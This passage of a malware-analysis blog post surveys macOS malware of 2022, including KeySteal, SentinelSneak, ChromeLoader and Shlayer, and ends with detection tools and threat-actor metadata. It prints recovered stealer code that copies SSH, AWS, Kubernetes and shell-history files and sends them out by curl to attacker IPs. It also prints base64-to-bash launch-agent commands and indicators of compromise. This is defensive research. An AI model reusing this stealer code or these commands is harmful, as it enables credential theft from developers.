VirusTotal under the name archive.pkg.\"_\n-TrendMicro\n\nKeySteal, submitted to VirusTotal\nAs noted, it was not (yet) seen in the wild, and as such, we don‚Äôt currently know its infection\nvector. However, as the sample was packaged up in a .pkg, it is likely that infection would\nrequire user-interaction (vs. say a remote exploit).\n\n[Its worth noting that though the package was signed, as shown by WhatsYourSign, Apple](https://objective-see.com/products/whatsyoursign.html)\nhas now revoked the certificate:\n\n\n-----\n\nCode-Signing Certificate, now Revoked\n\n**Persistence: Launch Item**\n\nUsing the [Suspicious Package utility, we can examine the malicious packages, noting that it](https://mothersruin.com/software/SuspiciousPackage/)\nwill create the following:\n\na (trojanized) copy of the popular ResignTool in /Applications\na persistent Launch Daemon property list file com.apple.googlechrome.plist\na binary named Google Chrome in /Library/QuickTime\n\n\n-----\n\nPackage Contents / Installed Files\nLet‚Äôs take a peek at the com.apple.googlechrome.plist file:\n```\n 1<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n\n 2<!DOCTYPE plist PUBLIC \"-//Apple//DTD PLIST 1.0//EN\" ...\">\n\n 3<plist version=\"1.0\">\n\n 4<dict>\n\n 5 <key>KeepAlive</key>\n\n 6 <true/>\n\n 7 <key>Label</key>\n\n 8 <string>com.apple.googlechrome</string>\n\n 9 <key>Program</key>\n\n10 <string>/Library/QuickTime/Google Chrome</string>\n\n11 <key>RunAtLoad</key>\n\n12 <true/>\n\n13</dict>\n\n14</plist>\n\n```\nIn the ProgramArguments key we can see the path to the persistent location of the malware:\n```\n/Library/QuickTime/Google Chrome. Also, as the RunAtLoad key is set to true, the\n\n```\nmalware will be automatically restarted each time the user logs in. Persistence achieved!\n\n**Capabilities: Keychain Stealer**\n\nThe TrendMicro researchers noted that both binaries dropped by the malware\n(ResignTool.app & Google Chrome) are designed to steal victim‚Äôs keychains.\n\n\n-----\n\n_...[the] ResignTool is where the operations of the malware function and this is how_\n_they steal the victim's keychain data.\nThe other dropped file [Google Chrome], has_\n_similar keychain stealing routine of the ResignTool binary.\" -TrendMicro_\n\nKeychains on macOS contain a host of sensitive information such as password, private\ncertificates, and more.\n\nThe malware (as pointed out by TrendMicro) will look for keychain data in the following\nlocations on an infected machine:\n\n~/Keychains\n/Library/Keychains\n~/MobileDevice/Provisioning Profiles\n\nWe can find these strings, embedded in the malware:\n```\n% strings - \"KeySteal/Google Chrome\"\n\n...\n\n%@/Keychains\n\nkeychain\n\nkeychain-db\n\n/Library/Keychains/\n\n%@/MobileDevice/Provisioning Profiles\n\nmobileprovision\n\n%@/%@\n\n.mobileprovision\n\n\n\n```\nIn a disassembler, we can decompile the malware‚Äôs code to find a snippet of this code\n(specifically in a function found at 0x00000001000021f8):\n```\n 1r15 = [[NSFileManager defaultManager] retain];\n\n 2rax = NSSearchPathForDirectoriesInDomains(0x5, 0x1, 0x1);\n\n 3...\n\n 4rbx = [[NSString stringWithFormat:@\"%@/Keychains\", r12] retain];\n\n 5rax = [r15 enumeratorAtPath:rbx];\n\n 6rax = [rax countByEnumeratingWithState:&var_4F0 objects:&var_B0 count:0x10];\n\n 7\n 8if (rax != 0x0) {\n\n 9   ...\n\n10   rax = (rbx)(r13, @selector(pathExtension));\n\n11   r12 = [rax isEqualTo:@\"keychain\"];\n\n12   if (r12 == 0x0) {\n\n13    rax = [r13 pathExtension];\n\n14    r12 = [rax isEqualTo:@\"keychain-db\"];               \n\n15\n16...\n\n```\n\n-----\n\nKeychain data is then exfiltrated to the attacker s server (found at\n```\nusa.4jrb7xn8rxsn8o4lghk7lx6vnvnvazva.com) via a call to method named:\nencryptBase64Data.\n\n```\n**Indicators of Compromise (IoCs):**\n\nIoCs for KeySteal include the following (credit: TrendMicro):\n\nExecutable Components:\n```\n      /Applications/ResignTool.app:\n      410da3923ea30d5fdd69b9ae69716b094d276cc609f76590369ff254f71c65da\n      /Library/QuickTime/Google Chrome:\n      f5b4a388fee4183dfa46908000c5c50dceb4bf8025c4cfcb4d478c5d03833202\n\n```\nFiles/Directories:\n```\n      /Library/QuickTime/\n      /Library/LaunchDaemons/com.apple.googlechrome.plist\n\n```\nNetwork:\n```\n      usa.4jrb7xn8rxsn8o4lghk7lx6vnvnvazva.com/\n\n## üëæ SentinelSneak\n\n```\nRelying on a ‚Äútyposquatting‚Äù attack, this malicious Python package targeted developers with\nthe goal of exfiltrating sensitive data.\n\n[Download: SentinelSneak (password: infect3d)](https://github.com/objective-see/Malware/raw/main/SentinelSneak.zip)\n\n[A week before 2022 ended, researchers from ReversingLabs published a report, detailing](https://www.reversinglabs.com/blog/sentinelsneak-malicious-pypi-module-poses-as-security-sdk)\nthe discovery of a malicious Python package that masquerades as a legitimate one.\n\n\n-----\n\nThe latest edition of The Week in [#Security is here. This week:](https://twitter.com/hashtag/Security?src=hash&ref_src=twsrc%5Etfw) [#Okta is hit with](https://twitter.com/hashtag/Okta?src=hash&ref_src=twsrc%5Etfw)\n[another security incident involving its private #GitHub repos. Also:](https://twitter.com/hashtag/GitHub?src=hash&ref_src=twsrc%5Etfw) [@ReversingLabs](https://twitter.com/ReversingLabs?ref_src=twsrc%5Etfw)\n[researchers discovered a malicious #PyPI package posing as a #SentinelOne](https://twitter.com/hashtag/PyPI?src=hash&ref_src=twsrc%5Etfw) [#SDK](https://twitter.com/hashtag/SDK?src=hash&ref_src=twsrc%5Etfw)\nclient. [https://t.co/Nhskl2p2QQ](https://t.co/Nhskl2p2QQ)\n\n[‚Äî ReversingLabs (@ReversingLabs) December 22, 2022](https://twitter.com/ReversingLabs/status/1606003388465954816?ref_src=twsrc%5Etfw)\n\n**Writeups:**\n\n[‚ÄúSentinelSneak: Malicious PyPI module poses as security software development kit‚Äù](https://www.reversinglabs.com/blog/sentinelsneak-malicious-pypi-module-poses-as-security-sdk)\n\n**Infection Vector: TypoSquatting**\n\nThe ReversingLabs write-up describes SentinelSneak‚Äôs infection vector:\n\n\"A malicious Python package [containing `SentinelSneak`] is posing as a software\n_development kit (SDK) for the security firm SentinelOne.... The package, SentinelOne_\n_has no connection to the noted threat detection firm of the same name and was..._\n_uploaded to PyPI, the Python Package Index.\nThe `SentinelOne` imposter package is_\n_just the latest threat to leverage the PyPI repository and underscores the growing_\n_threat to software supply chains, as malicious actors use strategies like ‚Äútyposquatting‚Äù_\n_to exploit developer confusion and push malicious code into development pipelines_\n_and legitimate applications.\" -ReversingLabs_\n\n\n-----\n\nMalicious 'TypoSquatting' Package (credit: ReversingLabs)\nAs was the case with the other malware of 2022 the spread via ‚Äútyposquatting‚Äù attacks (e.g.\n```\nCrateDepression and Pymafka ) SentinelSneak would infect users who inadvertently\n\n```\ndownloaded it while looking for the legitimate SentinelOne API Python Package\n(SentinelOne4py).\n\nWorth noting too, simply downloading/installing package won‚Äôt trigger an infection. Instead it\nmost be used programmatically:\n\n\n-----\n\n_The malicious functionality in the library does not execute upon installation, but waits_\n_to be called on programmatically before activating ‚Äî a possible effort to avoid_\n_detection.\" -ReversingLabs_\n\n‚Ä¶this sneakiness lead to its name; SentinelSneak.\n\n**Persistence: None?**\n\nIt does not appear that SentinelSneak persists. Instead (as we‚Äôll show below in the\n‚ÄòCapabilities‚Äô section), its goal is merely to exfiltrate sensitive files to a remote server.\n\nHowever it appears that each time the malicious library is programmatically utilized, the\nmalicious code with be (re)executed, and thus exfiltration can occur multiple times.\n\n**Capabilities: Data Stealer**\n\nThe sole goal of SentinelSneak is to steal (exfiltrate) sensitive developer-related files off an\ninfected machine:\n\n\"A detailed analysis of [the malicious] code revealed capabilities that are focused on\n_exfiltration of data that is characteristic for development environments.\" -_\nReversingLabs\n\nThe malicious logic to perform such exfiltration is found in file named api.py:\n```\n1def run():\n\n2  ...\n\n3  if sys.platform == \"darwin\":\n\n4    writeFile()\n\n5  elif sys.platform == \"linux\":\n\n6    writeFile1()\n\n7  ...\n\n```\nFirst, we find a snippet in the run method that invokes platform specific-logic. Here, we‚Äôll\nfocus on the darwin (macOS) code ‚Ä¶found in a method named writeFile:\n\n\n-----\n\n```\n 1def writeFile(serialId default ):\n\n 2  username = get_username()\n\n 3  foldername = '/Users/' + username + '/Library/Logs/tmp'\n\n 4  zipname = '/Users/' + username + '/Library/Logs/tmp.zip'\n\n 5  filename = '/Users/' + username + '/Library/Logs/tmp/tmp.txt'\n\n 6  if os.path.exists(foldername):\n\n 7    # print('11111')\n\n 8    shutil.rmtree(foldername)\n\n 9  os.makedirs(foldername)\n\n10  with open(filename, 'a+') as file:\n\n11    file.write('hosts : [{}]'.format(get_hosts()) + '\\n')\n\n12    file.write('username : ' + get_username() + '\\n')\n\n13    file.write('test : [{}]'.format(subprocess_popen(\"bash -c ls /\")) +'\\n')\n\n14\n15  bashHistory = '/Users/' + username + '/.bash_history'\n\n16  zshHistory = '/Users/' + username + '/.zsh_history'\n\n17\n18  gitConfig = '/Users/' + username + '/.gitConfig'\n\n19  hosts = '/etc/hosts'\n\n20  ssh = '/Users/' + username + '/.ssh'\n\n21  zhHistory = '/Users/' + username + '/.zhHistory'\n\n22  aws = '/home/' + username + '/.aws'\n\n23  kube = '/home/' + username + '/.kube'\n\n24\n25  serialId = str(subprocess_popen(\"hostname\"))\n\n26  if os.path.exists(bashHistory):\n\n27    shutil.copyfile(bashHistory, foldername + '/bashHistory')\n\n28  if os.path.exists(zshHistory):\n\n29    shutil.copyfile(zshHistory, foldername + '/zsh_history')\n\n30\n31  if os.path.exists(gitConfig):\n\n32    shutil.copyfile(gitConfig, foldername + '/gitConfig')\n\n33  if os.path.exists(hosts):\n\n34    shutil.copyfile(hosts, foldername + '/hosts')\n\n35  if os.path.exists(ssh):\n\n36    shutil.copytree(ssh, foldername + '/ssh')\n\n37  if os.path.exists(zhHistory):\n\n38    shutil.copyfile(zhHistory, foldername + '/zhHistory')\n\n39  if os.path.exists(aws):\n\n40    shutil.copyfile(aws, foldername + '/aws')\n\n41  if os.path.exists(kube):\n\n42    shutil.copyfile(kube, foldername + '/kube')\n\n43  zip_ya(foldername)\n\n44  shutil.rmtree(foldername)\n\n45  command = \"curl -k -F \\\"file=@\" + zipname + \"\\\"\n\\\"https://54.254.189.27/api/v1/file/upload\\\" > /dev/null 2>&1\"\n\n46  os.system(command)\n\n47  os.remove(zipname)\n\n```\nAs the Python code is not obfuscated, it fairly easy to understand. In a nutshell it copies\nvarious files (e.g. /.bashHistory, /.gitConfig, /.ssh, /.aws, etc) into a file named\n```\n~/Library/Logs/tmp/tmp txt These files are then zipped up and exfiltrated via curl to\n\n```\n\n-----\n\n```\n54.254.189.27.\n\n```\nJamf researchers noticed a high similarity to the malware known as ZuRu (uncovered in 2021\n[and blogged about by yours truly here). Specifically both ZuRu and SentinelSpy leverage](https://objective-see.org/blog/blog_0x66.html)\nrather similar Python code to exfiltrate files. Below is a snippet from ZuRu‚Äôs g.py file:\n```\n 1def writeFile():\n\n 2  username = get_username()\n\n 3  foldername = '/Users/' + username + '/Library/Logs/tmp'\n\n 4  zipname = '/Users/' + username + '/Library/Logs/tmp.zip'\n\n 5  filename = '/Users/' + username + '/Library/Logs/tmp/tmp.txt'\n\n 6  if os.path.exists(foldername):\n\n 7    # print('11111')\n\n 8    shutil.rmtree(foldername)\n\n 9  os.makedirs(foldername)\n\n10  with open(filename, 'a+') as file:\n\n11    ...\n\n12    file.write('hostsÊñá‰ª∂ : [{}]'.format(get_hosts()) + '\\n')\n\n13    file.write('ÂΩìÂâçÁî®Êà∑Âêç : ' + get_username() + '\\n')\n\n14    file.write('test : [{}]'.format(subprocess_popen(\"bash -c ls /\")) + '\\n')\n\n15\n16  bashHistory = '/Users/' + username + '/.bash_history'\n\n17  zshHistory = '/Users/' + username + '/.zsh_history'\n\n18\n19  gitConfig = '/Users/' + username + '/.gitConfig'\n\n20  hosts = '/etc/hosts'\n\n21  ssh = '/Users/' + username + '/.ssh'\n\n22  zhHistory = '/Users/' + username + '/.zhHistory'\n\n23  ...\n\n24  if os.path.exists(bashHistory):\n\n25   shutil.copyfile(bashHistory, foldername + '/bashHistory')\n\n26  if os.path.exists(zshHistory):\n\n27   shutil.copyfile(zshHistory, foldername + '/zsh_history')\n\n28  if os.path.exists(gitConfig):\n\n29   shutil.copyfile(gitConfig, foldername + '/gitConfig')\n\n30  if os.path.exists(hosts):\n\n31   shutil.copyfile(hosts, foldername + '/hosts')\n\n32  if os.path.exists(ssh):\n\n33   shutil.copytree(ssh, foldername + '/ssh')\n\n34  if os.path.exists(zhHistory):\n\n35   shutil.copyfile(zhHistory, foldername + '/zhHistory')\n\n36   ...\n\n37  zip_ya(foldername)\n\n38  shutil.rmtree(foldername)\n\n39\n40  command = \"curl -F \\\"file=@\" + zipname + \"\\\" \\\"http://47.75.123.111/u.php?\nid=%s\\\" -v\" %serialId\n\n41  os.system(command)\n\n42  os.remove(zipname)\n\n43  ...\n\n```\n\n-----\n\n‚Ä¶almost identical! üßê\n\n**Indicators of Compromise (IoCs):**\n\nIoCs for SentinelSneak include the following (credit: ReversingLabs):\n\nNetwork:\n```\n      54.254.189.27\n\n```\nFor a (rather long) list of hashes of the malicious python packages, see ReversingLabs‚Äô\n[report.](https://www.reversinglabs.com/blog/sentinelsneak-malicious-pypi-module-poses-as-security-sdk)\n\n## üëæ And All Others\n\nThis blog post provided a comprehensive technical analysis of the new mac malware of\n2022. However it did not cover adware or malware from previous years. Of course, this is not\nto say such items are unimportant.\n\nAs such, here I‚Äôve include a list (and links to detailed writeups) of other notable items from\n2022, for the interested reader.\n\n\n-----\n\nüëæ `NukeSped (variant N)`\n\nIn May, and again in August, ESET researchers observed attacks dropping the\nNukeSped malware:\n\n[#ESETresearch A year ago, a signed Mach-O executable disguised as a job](https://twitter.com/hashtag/ESETresearch?src=hash&ref_src=twsrc%5Etfw)\ndescription was uploaded to VirusTotal from Singapore üá∏üá¨. Malware is compiled\nfor Intel and Apple Silicon and drops a PDF decoy. We think it was part of\n[#Lazarus campaign for Mac. @pkalnai](https://twitter.com/hashtag/Lazarus?src=hash&ref_src=twsrc%5Etfw) [@marc_etienne_ 1/8](https://twitter.com/marc_etienne_?ref_src=twsrc%5Etfw)\n[pic.twitter.com/DV7peRHdnJ](https://t.co/DV7peRHdnJ)\n\n[‚Äî ESET Research (@ESETresearch) May 4, 2022](https://twitter.com/ESETresearch/status/1521735320852643840?ref_src=twsrc%5Etfw)\n\n[#ESETresearch](https://twitter.com/hashtag/ESETresearch?src=hash&ref_src=twsrc%5Etfw) [#BREAKING A signed Mac executable disguised as a job](https://twitter.com/hashtag/BREAKING?src=hash&ref_src=twsrc%5Etfw)\ndescription for Coinbase was uploaded to VirusTotal from Brazil üáßüá∑. This is an\n[instance of Operation In(ter)ception by #Lazarus for Mac.](https://twitter.com/hashtag/Lazarus?src=hash&ref_src=twsrc%5Etfw) [@pkalnai](https://twitter.com/pkalnai?ref_src=twsrc%5Etfw)\n[@dbreitenbacher 1/7](https://twitter.com/dbreitenbacher?ref_src=twsrc%5Etfw) [pic.twitter.com/dXg89el5VT](https://t.co/dXg89el5VT)\n\n[‚Äî ESET Research (@ESETresearch) August 16, 2022](https://twitter.com/ESETresearch/status/1559553324998955010?ref_src=twsrc%5Etfw)\n\nThe NukeSped malware is associated with the Lazarus APT group (North Korea), and\nthis year‚Äôs campaign is rather similar to those of past years.\n\nWriteup:\n\n[‚ÄúNorth Korean hackers use signed macOS malware to target IT job seekers‚Äù](https://www.bleepingcomputer.com/news/security/north-korean-hackers-use-signed-macos-malware-to-target-it-job-seekers/)\n\n\n-----\n\nüëæ `ChromeLoader (adware)`\nIn January a new adware campaign was uncovered, dubbed ChromeLoader. Over the\nnext few months, various companies (including RedCanary, Palo Alto Networks, and\nCrowdStrike) tracked, analyzed, and published reports on this attack.\n\n[Though the attack campaign was originally discovered in January, a macOS variant did](https://twitter.com/x3ph1/status/1480385761295970305)\nnot appear till March:\n\n\"In March 2022, a new variant emerged targeting MacOS users. This variant\n_remains active and uses similar techniques to install its payload and hide its_\n_actions. It uses the same infection method of directing victims to compromised_\n_pay-per-download websites to install its dropper.\nIn this case, the dropper is a_\n_disk image (DMG) file ‚Äì the MacOS implementation for ISO files ‚Äì containing_\n_several files, including one bash script.\" -Palo Alto Networks_\n\nAs noted in the quote above, users were tricked into downloading malicious disk\nimages (that pretended to be legitimate software, and/or cracked/pirated software). The\nmalicious programs found on the .dmgs would persistently, as CrowdStriked noted,\n‚Äúmodify the user‚Äôs browsing experience to deliver ads.‚Äù\n\nChompex Installer (credit: CrowdStrike)\nThe Palo Alto Networks researchers noted that for the macOS variant, the disk images\nwould often contain a malicious bash script that performed two actions:\n\nDownloads a (malicious) browser extension\nLoads the extension into the victim‚Äôs browser\n\n\n-----\n\nFrom [their report, here is an example bash script:](https://unit42.paloaltonetworks.com/chromeloader-malware/#post-123828-_mpyacggxtibk)\n```\n1status code=$(curl -write-out %{http_code} --head --silent - -output /dev/null\nhttps://funbeachdude.com/gp)\n\n2if [[ \"status_code\" = 200 ]] ; then\n\n3 popUrl=$(curl -s 'https://funbeachdude.com/gp')\n\n4 performPop=$ (echo -ne \"open -na 'Google Chrome' -args - loadextension='$BPATH/$XPATH' --new-window '\"$popUr]\"';\" | base64);\n\n5else\n\n6 popUrl=\"0\"\n\n7fi\n\n```\nIn terms of persistence, the macOS variant may install a launch agent.\n\n\"To maintain persistence, the macOS variation of ChromeLoader will append a\n_preference (plist) file to the /Library/LaunchAgents directory. This ensures that_\n_every time a user logs into a graphical session, ChromeLoader‚Äôs Bash script can_\n_continually run. \" -Red Canary_\n\nThe [CrowdStrike report provides additional details showing that both the Chrome and](https://www.crowdstrike.com/blog/how-crowdstrike-uncovered-a-new-macos-browser-hijacking-campaign/)\nSafari variants of the malware would persist (as launch agent), with commands\nembedded directly in the property list:\n```\n//Chrome variant\n\n<key>ProgramArguments</key>\n\n<array>\n\n<string>sh</string>\n\n<string>-c</string>\n\n<string>echo aWYgcHMg -[ SNIP ]- Zmk= | base64 --decode | bash</string>\n\n</array>\n\n//Safari variant\n\n<key>ProgramArguments</key>\n\n<array>\n\n<string>sh</string>\n\n<string>-c</string>\n\n<string>echo aW1w -[ SNIP ]- kKQ== | base64 --decode | python | bash</string>\n\n</array>\n\n\n```\nAnd all this for? Simply, as pointed out by Red Canary, ‚Äúredirecting web traffic through\nadvertising sites‚Äù.\n\nWriteups:\n\n[‚ÄúChromeLoader: a pushy malvertiser‚Äù](https://redcanary.com/blog/chromeloader/)\n\n[‚ÄúChromeLoader: New Stubborn Malware Campaign‚Äù](https://unit42.paloaltonetworks.com/chromeloader-malware/#post-123828-_mpyacggxtibk)\n\n[‚ÄúCrowdStrike Uncovers New MacOS Browser Hijacking Campaign‚Äù](https://www.crowdstrike.com/blog/how-crowdstrike-uncovered-a-new-macos-browser-hijacking-campaign/)\n\n\n-----\n\nüëæ `Shlayer (adware)`\n\nShlayer is arguably the most prolific adware targeting macOS. And though it has been\nwell analyzed and its adware-related activities are well understoof, this year it\ncontinued to evolve.\n\n[In December, security researcher Taha Karim of Confiant posted a writeup detailing](https://objective-see.org/blog/blog_0x70.html)\nhow Shlayer (now) hides its configuration inside Apple proprietary DMG files:\n\nEncrypted Shlayer Configuration, Embedded in a DMG Header\nWhen Shlayer is executed, it will first execute a command to list mounted images,\nincluding image-path value which contains the path on disk to the parent DMG:\n\n\n-----\n\n```\n% hdiutil info plist | perl 0777pe s|\\\\s (. ?)\\\\s |$1|gs | plutil convert\njson -r -o - -- \n{\n\n \"framework\" : \"628.40.2\",\n\n \"images\" : [\n\n  {\n\n   \"autodiskmount\" : true,\n\n   \"blockcount\" : 8376,\n\n   \"blocksize\" : 512,\n\n   \"diskimages2\" : true,\n\n   \"hdid-pid\" : 88876,\n\n   \"image-encrypted\" : false,\n\n   \"image-path\" : \"\\/Users\\/user\\/Downloads\\/final-cut-pro-x-10-6-1crack.dmg\",\n\n   \"image-type\" : \"read-only disk image\",\n\n   \"owner-uid\" : 501,\n\n   \"removable\" : true,\n\n   \"system-entities\" : [\n\n    {\n\n     \"content-hint\" : \"GUID_partition_scheme\",\n\n     \"dev-entry\" : \"\\/dev\\/disk7\"\n\n    },\n\n    {\n\n     \"content-hint\" : \"48465300-0000-11AA-AA11-00306543EBAC\",\n\n     \"dev-entry\" : \"\\/dev\\/disk7s1\",\n\n     \"mount-point\" : \"\\/Volumes\\/Install\"\n\n    }\n\n   ],\n\n   \"writeable\" : false\n\n  }\n\n ],\n\n \"revision\" : \"628.40.2\",\n\n \"vendor\" : \"Apple\"\n\n}% \n\n```\nThen Shlayer opens its parent DMG and reads its header, block by block in order to\nfind its embedded configuration information. Once located the configuration data is\ndecrypted:\n\n\n-----\n\nOSX/Shlayer.F C2 config blob decryption routine\nBelow is an example of an extracted (decrypted) config from a Shlayer DMG file:\n```\n   {\n\n    \"du\": \"https://s3.amazonaws.com/b30fd539-402f-4/2b88cb8a-6f2c-44/9945647b   15bd-4a/Install.dmg?fn=final-cut-pro-x-10-6-1-crack-license-key-latest-jan   2022&subaff=2874&e=5&k=7288ee87-db3e-4c47-9dc0-00f009e583a0&s=614aa849-d491   4ad4-a7fe-3ff69cb6f316&client=safari\",\n\n    \"lu\": \"http://d2hznnx43bsrxg.cloudfront.net/slg?s=%s&c=%i&gs=1\",\n\n    \"bdu\": \"http://d2hznnx43bsrxg.cloudfront.net/sd/?\n   c=xGlybQ==&u=%s&s=%s&o=%s&b=15425161967&gs=1\",\n\n    \"upb\": \"76916152451219215425161967\",\n\n    \"p\":\n   \"nDS8MxD+Tkb54Ocij+4ZMid1lT4f16QCAf/SsI8i+eT0HFx7udZJJTVL/7YETnYwBboycKYxn/WcRdl\n   y3ZNwI3lmhMgWobbf7vzy3nUKFhA/PG7wE/TnI7zwmTLlUCMn8ZlR2IhYTgk12+tVwcGfxRP6pjri4Un\n   9Y6b/Pt8/0MGFWY5mSfY7+cRLhnyqLj3EmNoGcuVlV21s6bYZkgmKOAIjbWyQzLLVaw5LBxZK9x4elDe\n   1OKcWdDzNp6Ar+42KYuZPnGlUVa7jUd+5diFSR73wxDIX2TdL+zfcsB4ampVkEUH07Wq8lvlFRKw6Sms\n   J96ptBR02JD5IgxxhXMaZfHc40E1ZOmxLHltCwpM1yx3aWQA8HUOQedjJnym92q1FDHFixfEgznTOxDZ\n   qAjULXPycYXsTkqRxrDqAWhPoSPi5fg3XywrhiytODCbsqbOk9KuryY/FlIdxD97p3V7jIpCi+6fCNeg\n   Pj08uMmNt7BgrZDGwPoElyiaDEUlbvCc8wIB78QHi9f4GyRUkMmxeuWCLpTl63h+ynkNtPc4PbXe13x0\n   z25s7nZWkPPouEfb8FlxF2LbG1HCXT9nzI9Dt/FHAgANbrAaXUEKmCjBlZnZLahkH2Tua6QaQ7GhV2Cn\n   ayZctKAEdXMLVAUbpRRKK6lbmjvFGJigfarrNzAg8i3OONoKWA+nlnDE2kJ4Im9JaIjOo9KukCwjxt0f\n   pV7JnvNCMg1IUQj34a41V261i2PvIGDBBIpRlFdKaWw9BFoK5uvG/V3PzHxU6l2E3seuPYFFeQPnHKk4\n   W4ZF6NRRmQLThRVz3RxCKGWM9eMVJNDgbTb7fhFrMBgWLspSo9c7w3Uw1N0GGKMN4U5BFQx64TcXCttA\n   Ph8i9T5PQUsLm+mvJpxlWZWKtR0C+uLlQfAqAADGxfqrFlV6ZiEOXjMqdCB4tdvDEWbuEXBr6+yCut+9\n   wNlu3/torf2UcPFR3iMM=\",\n\n    \"umu\": false\n\n   }\n\n```\nWriteup:\n\n‚ÄúL‚Äôart de l‚Äô√©vasion: How Shlayer hides its configuration inside Apple proprietary DMG\nfiles‚Äù\n\n## üõ° Detections\n\n\n-----\n\nNew malware is notoriously difficult to detect via traditional signature-based approaches ‚Ä¶\nas, well, it‚Äôs new! A far better approach is to leverage heuristics or behaviors, that can detect\nsuch malware, even with no a priori knowledge of the specific (new) threats.\n\nFor example, imagine you open an Office Document that (unbeknownst to you) contains an\nexploit or malicious macros which installs a persistent backdoor. This is clearly an unusual\nbehavior, that should be detected and alerted upon.\n\nGood news, Objective-See‚Äôs [free open-source macOS security tools do not leverage](https://objective-see.org/tools.html)\nsignatures, but instead monitor for such (unusual, and likely malicious) behaviors.\n\nThis allows them to detect and alert on various behaviors of the new malware of 2022 (with\nno prior knowledge of the malware).\n\nFor example, let‚Äôs look at how SysJoker, the first malware of 2022, was detected by our free\ntools:\n\nFirst, [BlockBlock detects SysJoker‚Äôs attempt at persistence (a launch item named](https://objective-see.com/products/blockblock.html)\n```\ncom.apple.update.plist):\n\n```\nBlockBlock's alert\n[LuLu, our free, open-source firewall detects when the malware first attempts to beacon out to](https://objective-see.com/products/lulu.html)\ngrab the encrypted address of it‚Äôs command and control server:\n\n\n-----\n\nLuLu's alert\nAnd if you‚Äôre worried that you are already infected with SysJoker? [KnockKnock can uncover](https://objective-see.com/products/knockknock.html)\nthe malware‚Äôs persistence (after the fact):\n\nKnockKnock's detection\n\nFor more information about our free, open-source tools, see:\n\n[Objective-See's Tools.](https://objective-see.org/tools.html)\n\n## üëãüèº Conclusion:\n\n\n-----\n\nWell that‚Äôs a wrap! Thanks for joining our ‚Äújourney‚Äù as we wandered through the macOS\nmalware of 2022.\n\nWith the continued growth and popularity of macOS (especially in the enterprise!), 2023 will\nsurely bring a bevy of new macOS malware.\n\n‚Ä¶so, stay safe out there!\n\nüìö Interested in general Mac malware analysis techniques?\n\nYou're in luck, as I've written a book\non this topic:\nThe Art Of Mac Malware, Vol. 0x1:\nAnalysis\n\nThis website uses cookies to improve your experience.\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2023/2023-01-01 - The Mac Malware of 2022.pdf"
    ],
    "report_names": [
        "2023-01-01 - The Mac Malware of 2022.pdf"
    ],
    "threat_actors": [
        {
            "id": "cfdd35af-bd12-4c03-8737-08fca638346d",
            "created_at": "2022-10-25T16:07:24.165595Z",
            "updated_at": "2025-03-27T02:02:10.128957Z",
            "deleted_at": null,
            "main_name": "Sea Turtle",
            "aliases": [
                "Cosmic Wolf",
                "Marbled Dust",
                "Silicon",
                "Teal Kurma",
                "UNC1326"
            ],
            "source_name": "ETDA:Sea Turtle",
            "tools": [
                "Drupalgeddon"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "aa73cd6a-868c-4ae4-a5b2-7cb2c5ad1e9d",
            "created_at": "2022-10-25T16:07:24.139848Z",
            "updated_at": "2025-03-27T02:02:10.120505Z",
            "deleted_at": null,
            "main_name": "Safe",
            "aliases": [],
            "source_name": "ETDA:Safe",
            "tools": [
                "DebugView",
                "LZ77",
                "OpenDoc",
                "SafeDisk",
                "TypeConfig",
                "UPXShell",
                "UsbDoc",
                "UsbExe"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "33eef76c-a6fa-4855-a77e-9a1e92fe8474",
            "created_at": "2023-11-21T02:00:07.393519Z",
            "updated_at": "2025-03-27T02:00:03.250084Z",
            "deleted_at": null,
            "main_name": "Storm Cloud",
            "aliases": [],
            "source_name": "MISPGALAXY:Storm Cloud",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "f3b19931-3751-4ece-a235-15b397951dc2",
            "created_at": "2022-10-25T16:07:23.889537Z",
            "updated_at": "2025-03-27T02:02:10.015565Z",
            "deleted_at": null,
            "main_name": "Nazar",
            "aliases": [
                "SIG37"
            ],
            "source_name": "ETDA:Nazar",
            "tools": [
                "Distribute.exe",
                "EYService",
                "GpUpdates.exe",
                "Microolap Packet Sniffer",
                "TCPDUMP for Windows"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "452d2d74-e812-45d6-b0fe-b8a6cc4ebd01",
            "created_at": "2022-10-25T16:07:23.562676Z",
            "updated_at": "2025-03-27T02:02:09.865955Z",
            "deleted_at": null,
            "main_name": "Earth Berberoka",
            "aliases": [
                "GamblingPuppet"
            ],
            "source_name": "ETDA:Earth Berberoka",
            "tools": [
                "Agent.dhwf",
                "AngryRebel",
                "AsyncRAT",
                "CinaRAT",
                "Destroy RAT",
                "DestroyRAT",
                "Farfli",
                "Gh0st RAT",
                "Ghost RAT",
                "Kaba",
                "Korplug",
                "Moudour",
                "Mydoor",
                "PCRat",
                "PlugX",
                "PuppetLoader",
                "Quasar RAT",
                "QuasarRAT",
                "RedDelta",
                "Sogu",
                "TIGERPLUG",
                "TVT",
                "Thoper",
                "Trochilus RAT",
                "Xamtrav",
                "Yggdrasil",
                "oRAT"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "e3492534-85a6-4c87-a754-5ae4a56d7c8c",
            "created_at": "2022-10-25T15:50:23.819113Z",
            "updated_at": "2025-03-27T02:00:55.552554Z",
            "deleted_at": null,
            "main_name": "Threat Group-3390",
            "aliases": [
                "Threat Group-3390",
                "Earth Smilodon",
                "TG-3390",
                "Emissary Panda",
                "BRONZE UNION",
                "APT27",
                "Iron Tiger",
                "LuckyMouse"
            ],
            "source_name": "MITRE:Threat Group-3390",
            "tools": [
                "Systeminfo",
                "gsecdump",
                "PlugX",
                "ASPXSpy",
                "Cobalt Strike",
                "Mimikatz",
                "Impacket",
                "gh0st RAT",
                "certutil",
                "China Chopper",
                "HTTPBrowser",
                "Tasklist",
                "netstat",
                "SysUpdate",
                "HyperBro",
                "ZxShell",
                "RCSession",
                "ipconfig",
                "Clambling",
                "pwdump",
                "NBTscan",
                "Pandora",
                "Windows Credential Editor"
            ],
